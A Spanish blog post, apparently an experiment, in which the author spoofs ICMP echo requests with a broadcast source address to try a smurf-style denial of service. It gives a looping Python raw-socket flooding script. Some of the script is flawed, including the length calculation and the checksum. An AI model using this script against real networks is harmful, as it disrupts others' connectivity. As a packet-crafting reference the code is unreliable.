Estos días he estado experimentando un poco con una característica de las redes. En concreto he intentando ver si era posible lanzar un paquete a la red cuyo origen es una dirección broadcast y el receptor, al mandar la respuesta, lo hiciera sin darse cuenta a todos los equipos de la red. Esto en efecto podría usarse para inutilizar una red por Denial of Service.<br><h2>ICMP ECHO</h2><br>La prueba la he hecho con un ICMP ECHO pero podría hacerse con otros protocolos también, como DHCP.<br><br>Un ICMP ECHO es lo que hace el famoso comando <strong>ping</strong> o <strong>ping6</strong> (en IPv6). Se trata de un protocolo de la capa de red (capa 3 en TCP/IP). ICMP dispone de varias operaciones para funcionar correctamente (Internet Control Message Protocol, controlar la red) pero la mayoría de ellas no se utilizan. Una que sí se usa es el ECHO, que permite mandar una información a un host y el host nos tiene que devolver lo mismo.<br><br>¿Cómo sabe a donde tiene que enviar la respuesta? A la IP de origen del primer paquete claro, pero ¿y si mentimos? ¿Y si le ponemos que la IP de origen es la IP de broadcast? Supuestamente, enviaría la respuesta a todos los demás hosts de la subred.<br><br><a href="https://files.adrianistan.eu/Captura-de-pantalla-9.png"><img src="https://files.adrianistan.eu/Captura-de-pantalla-9-1024x640.png" alt="" width="840" height="525" class="aligncenter size-large wp-image-784" /></a><br><br><h2>Script en Python</h2><br>Para poder hacer los datagramas IP personalizados y poder mentir, usé raw sockets. Estos solo me han funcionado en Linux. El código es muy simple, la parte que más me costó fue el checksum pues las operaciones con bytes en Python son un poco curiosas, no existiendo el tipo byte pero si bytes.<br><br><pre class="lang:python decode:true"><br>import socket<br>import struct<br>import random<br>import binascii<br>import sys<br>import functools<br><br>ICMP_CODE = socket.getprotobyname(&quot;icmp&quot;)<br>ICMP_ECHO = 8<br>IP_SRC = &quot;192.168.0.255&quot;<br>IP_DST = &quot;192.168.0.255&quot;<br><br>def main():<br>    s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)<br>    s.setsockopt(socket.SOL_IP,socket.IP_HDRINCL,1)<br>    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)<br>    packet_id = int((100000* random.random()) % 65535)<br>    packet = create_packet(packet_id)<br>    #print (&quot;Size of packet: &quot;+str(sys.getsizeof(packet)))<br>    s.sendto(packet,(IP_DST,0))<br><br>def create_header(data):<br>    version = 4 # IP version<br>    ihl = 5 # Numero de Bytes<br>    DF = 0<br>    Tlen = sys.getsizeof(data) + 20 # Longitud del datagrama<br>    ID = 1774 # ID de paquete<br>    Flag = 0 # Opciones<br>    Fragment = 0 # Numero de fragmento<br>    TTL = 128 # Tiempo de vida<br>    Proto = socket.IPPROTO_ICMP # Protocolo de los datos<br>    ip_checksum = checksum(data) # Checksum de los datos<br>    SIP = socket.inet_aton(IP_SRC) # Source IP address<br>    DIP = socket.inet_aton(IP_DST) # Destination IP address<br>    ver_ihl = (version &lt;&lt; 4) + ihl<br>    f_f = (Flag &lt;&lt; 13) + Fragment<br>    ip_hdr =  struct.pack(&quot;!BBHHHBBH4s4s&quot;, ver_ihl,DF,Tlen,ID,f_f,TTL,Proto,ip_checksum,SIP,DIP)<br>    return ip_hdr<br><br>def checksum(msg):<br>    flag = False<br>    suma = 0<br>    for byte in msg:<br>        if not flag:<br>            suma += (byte &lt;&lt; 8)<br>        else:<br>            suma += byte<br>        flag = not flag<br>    resto = suma &amp; 0xFFFF0000<br>    resto = resto &gt;&gt; 8<br>    suma += resto<br>    check = (~suma) &amp; 0x0000FFFF<br>    return check<br><br>def create_data(id):<br>    header = struct.pack(&quot;bbHHh&quot;, ICMP_ECHO, 0, 0, id, 1)<br>    data = b&quot;42&quot;<br>    header = struct.pack(&quot;bbHHh&quot;, ICMP_ECHO, 0, socket.htons(checksum(header+data)), id, 1)<br>    return header + data<br><br>def create_packet(packet_id):<br>    data = create_data(packet_id)<br>    header = create_header(data)<br>    return header+data<br>while True:<br>    main()<br><br></pre><br><br>Espero que a alguien le resulte interesante el código. Es un ejemplo de como generar datagramas sin la ayuda del sistema operativo. Además es importante saber que este tipo de programas solo pueden ejecutarse como root. Yo, por las pruebas que pude hacer, creo que los sistemas operativos actuales no son tontos y este tipo de ataques ya son conocidos. No pude capturar con Wireshark ninguno que fuese respuesta a broadcast, mientras que si la IP, aun siendo falsa, parecía real, sí que podía capturarla.<br>&nbsp;